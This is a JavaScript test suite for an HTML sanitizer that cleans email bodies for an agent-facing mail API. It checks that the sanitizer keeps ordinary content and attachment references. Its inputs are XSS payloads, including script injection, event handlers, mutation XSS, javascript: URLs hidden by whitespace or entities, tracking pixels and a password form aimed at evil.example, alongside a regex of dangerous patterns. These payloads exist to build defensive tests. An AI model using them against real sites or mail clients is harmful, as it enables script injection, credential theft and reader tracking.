'use strict';

const chai = require('chai');
const { webSafeHtml } = require('../lib/mcp-html');

const expect = chai.expect;

// Built with String.fromCharCode so the raw control characters survive editing and linting
const TAB = String.fromCharCode(9);
const NEWLINE = String.fromCharCode(10);
const C1 = String.fromCharCode(1);

// Anything in a sanitized body that would execute, load something remote, or collect input.
const DANGEROUS = /script|onerror|onload|onclick|javascript:|vbscript:|evil\.example|tracker\.png|srcdoc|data:text\/html|<form|<input|<base|<iframe|<object/i;

function expectInert(input, label) {
    let output = webSafeHtml(input);
    expect(DANGEROUS.test(output), `${label} left: ${output}`).to.equal(false);
    return output;
}

describe('MCP HTML sanitizer', () => {
    it('removes scripting however the markup is shaped', () => {
        // A raw-text element whose contents a lenient parser never tokenises, and a tag form
        // that a lenient tag regex does not match but a browser parses as a normal tag with
        // attributes. Both emitted attacker markup verbatim before this used a real sanitizer.
        expectInert('<pre><script>alert(1)</script></pre>', 'pre raw text');
        // htmlparser2 treats xmp as raw text as well, so dropping the tag alone would hand the
        // caller the attacker's own markup back as text
        expect(webSafeHtml('<xmp><script>alert(1)</script></xmp>')).to.equal('');
        expectInert('<xmp><img src=x onerror=alert(1)></xmp>', 'xmp raw text');
        expectInert('<PRE><script src="https://evil.example/x.js"></script></PRE>', 'uppercase pre');
        expectInert('<pre><img src=x onerror="fetch(\'https://evil.example\')"></pre>', 'pre with handler');
        expectInert('<img/src=x onerror=alert(1)>', 'slash delimited tag');
        expectInert('<svg/onload=alert(1)>', 'svg slash form');

        expectInert('<SCRIPT>alert(1)</SCRIPT>', 'uppercase script');
        expectInert('<scr<script>ipt>alert(1)</script>', 'split tag');
        expectInert('<math><mtext><script>alert(1)</script></mtext></math>', 'math namespace');
        expectInert('<noscript><p title="</noscript><img src=x onerror=alert(1)>">', 'mutation xss');
        expectInert('<body onload=alert(1)>hi</body>', 'body handler');
        expectInert('<div onclick="x()" style="background:url(https://evil.example)">t</div>', 'handler and style');
    });

    it('refuses a scheme hidden behind whitespace or an entity', () => {
        // Browsers strip tab, newline and carriage return from anywhere in a URL and decode
        // entities before parsing it, so each of these navigates as javascript:
        for (let href of [
            `java${TAB}script:alert(1)`,
            `java${NEWLINE}script:alert(1)`,
            'java&#9;script:alert(1)',
            'java&#10;script:alert(1)',
            'java&NewLine;script:alert(1)',
            `${C1}javascript:alert(1)`,
            '&#106;avascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)'
        ]) {
            let output = expectInert(`<a href="${href}">click</a>`, href);
            expect(output).to.include('click');
            expect(output).to.not.include('href=');
        }
    });

    it('lets nothing load a remote resource, whatever element carries it', () => {
        // Every one of these is a read receipt: it tells the sender the message was opened,
        // and hands them the reader's address and user agent.
        for (let markup of [
            '<img src="https://evil.example/p.gif">',
            '<img src="//evil.example/pixel.gif">',
            '<img src="/tracker.png">',
            '<img srcset="https://evil.example/x 1x">',
            '<video src="https://evil.example/t.mp4" autoplay>',
            '<audio src="https://evil.example/t.mp3" autoplay>',
            '<video autoplay><source src="https://evil.example/t.mp4"></video>',
            '<track src="https://evil.example/t.vtt">',
            '<video poster="https://evil.example/p.jpg">',
            '<link rel=stylesheet href="https://evil.example/x.css">',
            '<style>@import url(https://evil.example)</style>',
            '<iframe srcdoc="<script>alert(1)</script>">',
            '<object data="javascript:alert(1)">',
            '<base href="https://evil.example/">'
        ]) {
            expectInert(markup, markup);
        }
    });

    it('removes forms and the elements that collect input', () => {
        let output = expectInert('<form action="https://evil.example"><input name="password"><button>Go</button></form>', 'form');
        expect(output).to.not.include('password');
    });

    it('keeps the content an agent is there to read', () => {
        expect(webSafeHtml('<a href="https://ok.example/a?b=c#d">link</a>')).to.include('href="https://ok.example/a?b=c#d"');
        expect(webSafeHtml('<a href="mailto:a@b.c">mail</a>')).to.include('mailto:a@b.c');
        expect(webSafeHtml('<p>Hello <strong>world</strong></p><ul><li>one</li></ul>')).to.include('<strong>world</strong>');
        expect(webSafeHtml('<table><tr><td colspan="2">cell</td></tr></table>')).to.include('colspan="2"');
        expect(webSafeHtml('<blockquote>quoted</blockquote><pre>code block</pre>')).to.include('<blockquote>quoted</blockquote>');
    });

    it('keeps a reference to an attachment of this same message, in either spelling', () => {
        let output = webSafeHtml('<img src="cid:ATT00001" alt="chart">');

        expect(output).to.include('cid:ATT00001');
        // the alt text is the part an agent can actually read
        expect(output).to.include('alt="chart"');

        // What a stored body actually carries: WildDuck rewrites a cid: reference to this form
        // when it indexes the message, so a rule that only knew about cid: would drop the
        // inline image reference from every message read through the API
        let stored = webSafeHtml('<img src="attachment:ATT00001" alt="Northbank" width="120">');

        expect(stored).to.include('attachment:ATT00001');
        expect(stored).to.include('alt="Northbank"');

        // and the identifier is the one the attachment metadata reports, so the two can be
        // matched without resolving anything
        expect(webSafeHtml('<a href="attachment:ATT00002">invoice.pdf</a>')).to.include('attachment:ATT00002');
    });

    it('accepts the array of parts the API returns, and survives unusable input', () => {
        expect(webSafeHtml(['<p>one</p>', '<p>two</p>']))
            .to.include('one')
            .and.to.include('two');
        expect(webSafeHtml(undefined)).to.equal('');
        expect(webSafeHtml([])).to.equal('');
        expect(webSafeHtml('   ')).to.equal('');
        expect(webSafeHtml([null, 42, '<p>kept</p>'])).to.include('kept');
    });
});
